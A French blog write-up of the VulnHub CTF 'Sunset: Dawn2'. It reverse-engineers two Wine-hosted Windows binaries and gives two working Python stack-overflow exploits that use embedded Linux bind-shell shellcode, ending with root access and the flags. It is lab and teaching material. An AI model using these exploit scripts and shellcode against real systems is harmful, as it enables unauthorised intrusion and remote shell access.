---
title: "Solution du CTF Sunset: Dawn2 de VulnHub"
tags: [CTF, VulnHub]
---

[Sunset: Dawn2](https://vulnhub.com/entry/sunset-dawn2,424/) est un CTF qui m'a donné plus de difficultés que j'imaginais au début. Certes on entre très vite sur l'exploitation d'un stack overflow mais cette dernière est triviale.

Le problème, c'est que j'ai dû faire face à une sombre histoire de versions de Wine qui faisait que mon shellcode marchait en local, mais pas sur la VM (TLDR: Utilisez toujours des shellcodes Linux pour Wine).

## Et soudain, tout va très vite

```
Nmap scan report for 192.168.56.158
Host is up (0.00027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE   VERSION
80/tcp   open  http      Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
1435/tcp open  ibm-cics?
1985/tcp open  hsrp?
```

On a deux ports inconnus et la page web servie sur le port 80 nous invite à récupérer un exécutable :

> DAWN Multi Server - Version 1.1  
> 
> Important:  
> 
> Due the lack of implementation of the Dawn client, many issues may be experienced, such as the message not being delivered. In order to make sure the connection is finished and the message well received, send a NULL-byte at the ending of your message.  Also, the service may crash after several requests.  
> 
> Sorry for the inconvenience!

Il s'agit d'un binaire Windows. La VM étant sous Linux on devine qu'il est exécuté via Wine.

```console
$ file dawn.exe 
dawn.exe: PE32 executable (console) Intel 80386, for MS Windows, 7 sections
```

En analysant le binaire avec `Cutter`, on a un peu de mal à voir ce qu'il fait. En vérité, il ne fait pas grand-chose, d'ailleurs cela se voit dans la liste des imports qui n'a rien de bien intéressant.

Le programme n'a même pas de gestion de threads et ne fait pas non plus de fork quand un client se connecte.

Ce qu'il faut retenir principalement, c'est qu'après l'appel à `recv`, le programme appelle une fonction `fcn.3457114f` qui fait juste un `jmp 0x34576730`. Le code à cette adresse est le suivant :

```nasm
0x34576730      push    ebp
0x34576731      mov     ebp, esp
0x34576733      sub     esp, 0x10c
0x34576739      mov     eax, dword [arg_4h]
0x3457673c      push    eax        ; int32_t arg_8h
0x3457673d      lea     ecx, [var_110h]
0x34576743      push    ecx        ; int32_t arg_4h
0x34576744      call    fcn.34571cdf ; fcn.34571cdf
0x34576749      add     esp, 8
0x3457674c      mov     esp, ebp
0x3457674e      pop     ebp
0x3457674f      ret
```

La fonction `fcn.34571cdf` semble être une boucle qui prend le buffer reçu et sur chaque block de 4 octets effectue une addition puis un XOR.

Mais peu importe, cette fonction est vraisemblablement vulnérable, car à l'adresse `0x3457674f`, quand l'instruction `ret` est appelée, on contrôle ce qui est sur la pile et donc l'adresse de retour.

Il suffit s'envoyer un bon paquet de `A` (`0x41`) pour s'en rendre compte :

```console
$ wine dawn.exe 
002c:err:winediag:getaddrinfo Failed to resolve your host name IP
0080:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
0080:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
0080:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
0080:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
[+] The server has been started.
[*] The server is currently listening...
[+] A connection has been received, connection fd is 64, ip is : 127.0.0.1, port : 34506
0024:err:virtual:virtual_setup_exception stack overflow 772 bytes addr 0x41414141 stack 0x230cfc (0x230000-0x231000-0x330000)
```

J'utilise `pwntools` pour créer une chaine de caractères sans répétition :

```python
>>> from pwnlib.util.cyclic import cyclic_gen
>>> g = cyclic_gen()
>>> g.get(1024)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak'
```

Je lance `dawn.exe` en local avec la commande `winedbg --gdb dawn.exe` (l'option `--gdb` permet d'intégrer les features de `gdb` à `winedbg` via du remote debugging).

Et j'envoie la chaine sur le port 1985 de `dawn` :

```
[----------------------------------registers-----------------------------------]
EAX: 0x32fc0c ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
EBX: 0x7ffd1000 --> 0x10000 --> 0x0 
ECX: 0x446cf4 --> 0x1460000 --> 0x0 
EDX: 0x12a 
ESI: 0x345ccda8 --> 0x1 
EDI: 0x345ccdac --> 0x44f1e0 --> 0x44f1e8 ("dawn.exe")
EBP: 0x63616172 ('raac')
ESP: 0x32fd20 ("taacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaae"...)
EIP: 0x63616173 ('saac')
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x63616173
[------------------------------------stack-------------------------------------]
0000| 0x32fd20 ("taacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaae"...)
0004| 0x32fd24 ("uaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaae"...)
0008| 0x32fd28 ("vaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaae"...)
0012| 0x32fd2c ("waacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaae"...)
0016| 0x32fd30 ("xaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaae"...)
0020| 0x32fd34 ("yaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaae"...)
0024| 0x32fd38 ("zaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae"...)
0028| 0x32fd3c ("baadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaaf"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x63616173 in ?? ()
```

J'ai installé `Peda` dans `gdb` qui me donne rapidement les informations utiles.

Je vois que le registre `eax` pointe sur le début de la chaine.

Pour `eip`, il faut écrire 272 octets avant de l'écraser :

```python
>>> g.find("saac")
(272, 0, 272)
```

Et enfin, `esp` pointe comme d'habitude juste après dans le buffer avec des données que l'on contrôle aussi.

Je peux utiliser `ROPgadget` pour trouver des instructions intéressantes dans le binaire, par exemple :

```console
$ python ROPgadget.py --binary /tmp/dawn.exe | grep 'jmp eax'
0x345ba5fc : jg 0x345ba606 ; mov eax, dword ptr [ecx*4 + 0x345ba644] ; jmp eax
0x345be91c : jg 0x345be926 ; mov eax, dword ptr [ecx*4 + 0x345be964] ; jmp eax
0x345ba605 : jmp eax
0x345be91b : lea edi, [edi + 8] ; mov eax, dword ptr [ecx*4 + 0x345be964] ; jmp eax
0x345ba5fe : mov eax, dword ptr [ecx*4 + 0x345ba644] ; jmp eax
0x345be91e : mov eax, dword ptr [ecx*4 + 0x345be964] ; jmp eax
```

Mais 272 octets pour placer un shellcode, ça peut être assez court. On va donc le placer après l'adresse de retour. Ce gadget trouvé fera l'affaire :

```
0x345964ba : call esp
```

J'étais parti initialement sur l'idée de faire exécuter un shellcode Windows : [Windows/x86 - Dynamic Bind Shell + Null-Free Shellcode (571 Bytes)](https://www.exploit-db.com/shellcodes/47980).

C'était en effet ce que j'avais fait sur les CTFs [Netstart]({% link _posts/2022-11-08-Solution-du-CTF-Netstart-de-VulnHub.md %}) et [c0m80]({% link _posts/2018-03-04-Solution-du-CTF-C0m80-de-VulnHub.md %}).

## Wine : à consommer avec modération

D'ailleurs en local l'exploitation fonctionnait nickel et j'avais bien l'invite de commande avec `Z:>` sur le port 4444.

Mais impossible d'obtenir un shell sur le binaire de la VM.

J'ai donc choisi d'ouvrir la VM pour me rajouter un compte et déboguer le binaire sur place. Ce qui n'a pas été si facile, car gdb n'était pas présent (donc limité en features).

Il s'est avéré que le saut sur le shellcode se faisait bien, que les premières instructions étaient même exécutées, mais que ça merdait plus loin dans l'exécution.

Le shellcode en question va chercher en mémoire certaines chaines de caractères (genre `GetProcAddress`). Ma supposition, c'est qu'il ne la trouvait pas et par conséquent finissait par atteindre une adresse mémoire inaccessible ce qui causait un crash avec une erreur parlant de SEH.



Finalement en utilisant un shellcode Linux ça fonctionnait. Ma conclusion, c'est que ma version plus récente de Wine émule mieux le code Windows et parvient donc à exécuter le shellcode alors que celle un peu plus datée du CTF rencontre quelques difficultés à le faire.

Finalement le code d'exploitation est le suivant :

```python
import sys
import os
import socket
from struct import pack

call_esp = 0x345964ba

def exploit(ip, shellcode):
    sock = socket.socket()
    sock.connect((ip, 1985))
    buf = b"A" * 272 + pack("<I", call_esp) + shellcode + b"\0"
    sock.send(buf)
    sock.close()


# https://www.exploit-db.com/shellcodes/44602
# Linux/x86 - Bind (9443/TCP) Shell + fork() + Null-Free Shellcode (113 bytes)
shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8"
    b"\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3"
    b"\x66\xb8\x69\x01\x52\x66\x68"
    b"\x24\xe3"  # ==> port number = 9443; sock_ad.sin_port = htons(9443);
    b"\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66"
    b"\xb8\x6b\x01\x31\xc9\xcd\x80\x31\xd2\x31"
    b"\xf6\x66\xb8\x6c\x01\xcd\x80\x89\xc6\x31"
    b"\xc0\xb0\x02\xcd\x80\x31\xff\x39\xf8\x75"
    b"\xe8\x31\xc0\xb0\x06\xcd\x80\x89\xf3\xb1"
    b"\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31"
    b"\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68"
    b"\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1"
    b"\xb0\x0b\xcd\x80"
)

exploit(sys.argv[1], shellcode)
os.system(f"ncat {sys.argv[1]} 9443 -v")
```

L'utilisation d'un shellcode qui fork est nécessaire ici sinon le shell se ferme dès la connexion.

Exécution et récupération du premier flag :

```console
$ python3 exploit.py 192.168.56.161
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.161:9443.
id
uid=1000(dawn-daemon) gid=1000(dawn-daemon) groups=1000(dawn-daemon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
ls
dawn-BETA.exe
dawn.exe
user.txt
cat user.txt
ebcc766cc3d69da825efff32a5b1b304
```

## Destroy it one more time cause it's so good they built it twice

On note alors la présence d'un second binaire. Ce dernier est exécuté avec les droits root :

```
root       794  0.0  0.0   2388   692 ?        Ss   04:13   0:00 /bin/sh -c /usr/bin/wine /root/dawn-BETA
```

C'est ce dernier qui écoute sur le second port qu'on a vu au début (1435).

Quand je l'ouvre avec `Cutter` je remarque immédiatement une fonction avec un nom explicite :

```nasm
_vulnerable_function (void *arg_4h);
; var const char *src @ stack - 0x28
; var char *dest @ stack - 0xd
; arg void *arg_4h @ stack + 0x4
0x52501519      push    ebp
0x5250151a      mov     ebp, esp
0x5250151c      sub     esp, 0x28
0x5250151f      mov     eax, dword [arg_4h]
0x52501522      mov     dword [src], eax ; const char *src
0x52501526      lea     eax, [dest]
0x52501529      mov     dword [esp], eax ; char *dest
0x5250152c      call    _strcpy    ; sym._strcpy ; char *strcpy(char *dest, const char *src)
0x52501531      mov     eax, 1
0x52501536      leave
0x52501537      ret
```

On lui balance la chaine préalablement générée par `pwntools` :

```
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xcaea 
ECX: 0x42fc8f ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
EDX: 0x0 
ESI: 0xe 
EDI: 0x55386c --> 0x0 
EBP: 0x64616161 ('aaad')
ESP: 0x42fca0 ("aaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaace"...)
EIP: 0x65616161 ('aaae')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x65616161
[------------------------------------stack-------------------------------------]
```

Cette fois `eip` se situe au 13ᵉ octet et `esp` au 17ᵉ octet.

Autant dire que les modifications à apporter au premier exploit sont minimes (adresse du gadget + nombre d'octets au début du buffer) :

```python
import sys
import os
import socket
from struct import pack

call_esp = 0x52501513

def exploit(ip, shellcode):
    sock = socket.socket()
    sock.connect((ip, 1435))
    buf = b"A" * 13 + pack("<I", call_esp) + shellcode + b"\0"
    sock.send(buf)
    sock.close()


# https://www.exploit-db.com/shellcodes/44602
# Linux/x86 - Bind (9443/TCP) Shell + fork() + Null-Free Shellcode (113 bytes)
shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8"
    b"\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3"
    b"\x66\xb8\x69\x01\x52\x66\x68"
    b"\x24\xe3"  # ==> port number = 9443; sock_ad.sin_port = htons(9443);
    b"\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66"
    b"\xb8\x6b\x01\x31\xc9\xcd\x80\x31\xd2\x31"
    b"\xf6\x66\xb8\x6c\x01\xcd\x80\x89\xc6\x31"
    b"\xc0\xb0\x02\xcd\x80\x31\xff\x39\xf8\x75"
    b"\xe8\x31\xc0\xb0\x06\xcd\x80\x89\xf3\xb1"
    b"\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31"
    b"\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68"
    b"\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1"
    b"\xb0\x0b\xcd\x80"
)


exploit(sys.argv[1], shellcode)
os.system(f"ncat {sys.argv[1]} 9443 -v")
```

Et on obtient notre shell root :

```console
$ python3 exploit2.py 192.168.56.161
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.161:9443.
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
dawn-BETA.exe
proof.txt
cat proof.txt
              ,.  _~-.,               .
           ~'`_ \/,_. \_
          / ,"_>@`,__`~.)             |           .
          | |  @@@@'  ",! .           .          '
          |/   ^^@     .!  \          |         /
          `' .^^^     ,'    '         |        .             .
           .^^^   .          \                /          .
          .^^^       '  .     \       |      /       . '
.,.,.     ^^^             ` .   .,+~'`^`'~+,.     , '
&&&&&&,  ,^^^^.  . ._ ..__ _  .'             '. '_ __ ____ __ _ .. .  .
%%%%%%%%%^^^^^^%%&&;_,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,
&&&&&%%%%%%%%%%%%%%%%%%&&;,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=
%%%%%&&&&&&&&&&&%%%%&&&_,.;^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,
%%%%%%%%%&&&&&&&&&-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-==--^'~=-.,__,.-=~'
##mjy#####*"'
_,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,.-=~'`^`'~=-.,__,.-=~'

~`'^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^`'~=-.,__,.-=~'`^

Thanks to @M_Ercolino for the original application. Original code:https://itandsecuritystuffs.wordpress.com/2014/03/26/understanding-buffer-overflow-attacks-part-2/

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

cb484c37abf0ade3b36112335d81fa01
```

Pour ce qui est du fonctionnement du CTF on retrouve 3 commandes dans la crontab `root` :

```
# m h  dom mon dow   command
*/3 * * * * killall dawn.exe
*/3 * * * * killall dawn-BETA.exe
* * * * *  /usr/bin/wine /root/dawn-BETA
```

Et une pour l'utilisateur `dawn-daemon` :

```
# m h  dom mon dow   command
* * * * * /usr/bin/wine /home/dawn-daemon/dawn.exe
```
